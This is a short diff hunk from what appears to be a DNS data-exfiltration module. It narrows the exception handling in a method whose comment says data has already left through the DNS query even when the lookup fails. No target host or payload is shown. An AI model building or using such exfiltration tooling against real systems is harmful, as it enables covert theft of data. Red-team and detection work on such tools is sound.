@@ -170,8 +170,8 @@ class DNSExfiltration(BaseExfiltration):
     def _send_query(self, query_name: str) -> None:
         try:
             self._resolver.resolve(query_name, self._record_type)
-        except Exception:
-            # DNS 查询可能失败（NXDOMAIN），但数据已通过查询发送
+        except (OSError, ConnectionError, TimeoutError):
+            # DNS 查询可能失败（NXDOMAIN、超时），但数据已通过查询发送
             pass
 
     @staticmethod
